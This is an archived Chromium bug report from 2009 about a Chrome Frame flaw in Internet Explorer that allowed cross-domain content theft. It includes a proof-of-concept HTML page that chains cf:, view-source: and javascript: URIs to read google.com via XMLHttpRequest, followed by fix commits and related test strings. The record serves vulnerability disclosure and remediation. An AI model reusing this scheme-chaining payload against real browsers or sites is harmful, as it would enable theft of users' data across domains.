# Security: MSVR report: Chrome Frame allows x-domain data theft in IE

| Field | Value |
|-------|-------|
| **Issue ID** | [40077794](https://issues.chromium.org/issues/40077794) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | [Deleted User] |
| **Assignee** | mo...@google.com |
| **Created** | 2009-10-28 |
| **Bounty** | $500.00 |

## Description

Microsoft just reported an issue that allows cross-domain code stealing 
exploit using ChromeFrame plugin in Internet Explorer

MSVR Case Identifier: Cross-domain information stealing via Google 
ChromeFrame [MSVR-09-0061]

Finder: Billy Rios and Microsoft Vulnerability Research (MSVR)

Technical Details of the exploit:  
    A specially crafted web page can use ChromeFrame running in IE  to 
steal the script and html content from any arbitrary web site using 
XMLHTTP. This page forces ChromeFrame to load using the cf: protocol 
handler, pointing ChromeFrame to the view-source: protocol handler, and 
then finally points the view-source: protocol  handler to a JavaScript URI. 
This permits the attacker to run arbitrary JavaScript without domain 
restrictions, including access to the network stack and arbitrary web pages 
(though not the local filesystem). while the PoC supplied is directed at 
extracting content from Google.com, the exploit could be used for one site 
(badguy.com) to attack another (trusted-bank.com).


PoC Code:
<html>
<title>
Cross Domain Bug in Chrome Frame
</title>
<body>
<h1>
Cross Domain Bug in Chrome Frame
</h1>
This Page pulls content from Google.com using XMLHTTP
<iframe src="cf:view-source:javascript:req = new 
XMLHttpRequest();req.onreadystatechange = function(){if(req.readyState == 
4){if(req.status == 
200){alert(req.responseText);}else{alert(req.status);}}};req.open('GET', 
'http://www.google.com', true);req.send(null);"> </iframe>
</body>
</html>

Change the url, if trying from google.com domain.



## Timeline

### [Deleted User] (2009-10-28)

Sanjeev and I discussed this issue and the problem is not just limited to cf handler 
in ChromeFrame. This also happens in widget mode with an object tag. 

The problem is that the function that verifies valid Urls for CF launch also allows 
view-source: and about: Since view-source: handler in Chrome allows javascript 
(except for links navigation, etc), there is cross-domain access.

Solution is to disallow view-source as a valid handler itself when launching Urls in 
ChromeFrame except when done in a new windows where the default document.domain is 
empty. Also, it would be good to disallow javascript globally in view-source handler 
if not required.


### sc...@gmail.com (2009-10-28)

Adding in Billy Rios.... so watch what you say, I hear Billy's a real pain :)

Billy - next time, can you guys just file bugs directly here at crbug.com? "Security" 
bugs are kept suitably private from the world. Since we're an open source project, 
this is where you get:
- Status updates.
- Notification of fixes / releases.
- The ability to ping on progress.


### bi...@gmail.com (2009-10-28)

Will let MSVR know about filing at crbug.com.  That Billy Rios dude is a total PITA :)

BK

### sc...@gmail.com (2009-10-28)

@#3: yeah, let me know if you see him coming so I can cross the street :)

MSVR are welcome to hop on to this bug. It'd need a Google account (standard or Apps-
For-Your-Domain should both work for access control).

### sc...@gmail.com (2009-10-28)

[Empty comment from Monorail migration]

### am...@chromium.org (2009-10-29)

[Empty comment from Monorail migration]

### bu...@gmail.com (2009-10-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=30417 

------------------------------------------------------------------------
r30417 | amit@chromium.org | 2009-10-28 19:07:45 -0700 (Wed, 28 Oct 2009) | 8 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome_frame/utils.cc?r1=30417&r2=30416

Additional layer of protection to disable funky URLs through
view-source in chrome frame 

BUG=26129
TEST=cf:view-source:javascript:alert('foo') should not work in chrome frame.


Review URL: http://codereview.chromium.org/348006
------------------------------------------------------------------------


### bu...@gmail.com (2009-10-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=30418 

------------------------------------------------------------------------
r30418 | amit@chromium.org | 2009-10-28 19:14:17 -0700 (Wed, 28 Oct 2009) | 7 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/browser_url_handler.cc?r1=30418&r2=30417

Prevent 'view-source' from being abused by disabling anything
other than http, https, ftp or file protocols in it.

BUG=26129
TEST=view-source:javascript:alert('foo') should no longer work in chrome's address bar.

Review URL: http://codereview.chromium.org/348004
------------------------------------------------------------------------


### ab...@chromium.org (2009-10-29)

My understanding is that this is now FixUnreleased twice (in Chrome-land and in WebKit-land).

### bu...@gmail.com (2009-10-29)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=30462 

------------------------------------------------------------------------
r30462 | mal@chromium.org | 2009-10-29 10:02:07 -0700 (Thu, 29 Oct 2009) | 16 lines
Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/223/src/chrome/browser/browser_url_handler.cc?r1=30462&r2=30461
   M http://src.chromium.org/viewvc/chrome/branches/223/src/chrome_frame/utils.cc?r1=30462&r2=30461

Merge r30417 and r30418 to the 223 branch.

These two together address an issue with view-source and Chrome Frame.

30417: Additional layer of protection to disable funky URLs through
view-source in chrome frame

30418: Prevent 'view-source' from being abused by disabling anything
other than http, https, ftp or file protocols in it.

BUG=26129
TEST=cf:view-source:javascript:alert('foo') should not work in chrome frame.
TEST=view-source:javascript:alert('foo') should no longer work in chrome's address bar.

TBR= amit
Review URL: http://codereview.chromium.org/343030
------------------------------------------------------------------------


### am...@chromium.org (2009-10-29)

[Empty comment from Monorail migration]

### bi...@gmail.com (2009-10-30)

The strategy of allowing only the http/https protocol handlers from view-source is a 
solid one.  I actually brought up the scenario of chrome (proper) allowing 
javascript URIs in view-source in my initial report to MSVR… but I couldn’t find a 
way to get javascript execution without user interaction.  I’m glad you guys are 
adjusting the behavior.

I don’t have enough time to verify myself, but I was curious as to whether
 
GURL sub_url(crack_url.path());
if (sub_url.SchemeIs(chrome::kHttpScheme) || sub_url.SchemeIs(chrome::kHttpsScheme))
return true;

will survive a redirect from http: to javascript:?  I guess even if it didn’t, the 
XSS would be localized to a single domain…  an interesting test case nonetheless...

BK


### ab...@chromium.org (2009-10-30)

We've also added code to WebKit to refuse to ever execute JavaScript URLs on view-
source pages.

### am...@chromium.org (2009-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2009-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2009-10-31)

[Comment Deleted]

### [Deleted User] (2009-10-31)

Chrome Frame 4.0.223.14 (r30462):
Working OK in Vista - IE7/IE8.


### ma...@gmail.com (2009-11-20)

removing view restrictions now that the fix is released.

### sc...@gmail.com (2010-02-23)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-01-04)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update: assuming these security changes impacted stable based on some fuzzy filtering.

### js...@chromium.org (2011-10-05)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/26129?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077794)*
